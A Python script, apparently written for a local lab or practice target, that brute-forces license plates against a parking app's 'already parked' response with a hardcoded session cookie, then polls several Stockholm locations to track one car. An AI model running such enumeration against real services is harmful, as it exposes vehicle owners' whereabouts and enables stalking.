import requests

def guess_plate():

    # Add the locations list
    locations = [
        ('Gamla Stan', '64521d700df40a005e239df9'),
        ('Royal Palace', '64521d700df40a005e239dfa'),
        ('Vasa Museum', '64521d700df40a005e239dfb'),
        ('Skansen', '64521d700df40a005e239dfc'),
        ('Grona Lund', '64521d700df40a005e239dfd'),
        ('Stockholm City Hall', '64521d700df40a005e239dfe'),
        ('Fotografiska', '64521d700df40a005e239dff'),
        ('ABBA Museum', '64521d700df40a005e239d00'),
        ('National Museum', '64521d700df40a005e239d01'),
        ('Ericsson Globe', '64521d700df40a005e239d02'),
        ('Stadshuset', '64521d700df40a005e239d03'),
        ('Ostermalm', '64521d700df40a005e239d04'),
        ('Djurgarden', '64521d700df40a005e239d05'),
        ('ABBA Tribute Musuem', '64521d700df40a005e239d06'),
        ('Kunstradgarden Park', '64521d700df40a005e239d07'),
        ('Nobel Museum', '64521d700df40a005e239d08'),
        ('Moderna Museum', '64521d700df40a005e239d09'),
        ('Tantolunden Park', '64521d700df40a005e239d0a')
    ]
    url = 'http://localhost:3000/park'
    cookie = 'connect.sid=s%3A1H6gbONGLnoKBHPZUD4izoBUy4XrhB7T.z5%2BOW3hv8%2FRHWx9i8mli8oHryi2fm8vW%2BYd%2FJNf7lwA'
    red_url = 'http://localhost:3000/'

    # Define the valid characters for the license plate
    letter_chars = 'ABCDE'
    number_chars = '0123456789'

    # Define the range of possible license plates
    plates = [(l1 + l2 + l3 + n1 + n2 + n3)
              for l1 in letter_chars
              for l2 in letter_chars
              for l3 in letter_chars
              for n1 in number_chars
              for n2 in number_chars
              for n3 in number_chars]

    # Define the location ID
    location_id = '64521d700df40a005e239df9' #Gamla Stan
    time = 1

    # Loop through each license plate in the range
    for plate in plates:

        # Add the current guess to the payload
        payload = {
            'licensePlate': plate,
            'mintime': time,
            'location': location_id
        }

        headers = {
            'Cookie': cookie
        }

        # Send the request and check the response
        requests.post(url, data=payload, headers=headers)
        response = requests.get(red_url, headers=headers)

        if 'already parked' in response.text:
            print(f'This car is already parked in Gamla Stan with the license plate {plate}. Do not waste your money!')
            follow_the_plate = plate
            break

    # After finding the parked car, loop through each location
    for location_name, location_id in locations:

        # Send the request and check the response
        payload['location'] = location_id
        requests.post(url, data=payload, headers=headers)
        response = requests.get(red_url, headers=headers)

        if 'already parked' in response.text:
            print(f'This car is already parked at {location_name} with the license plate {follow_the_plate}.')


if __name__ == '__main__':
    guess_plate()
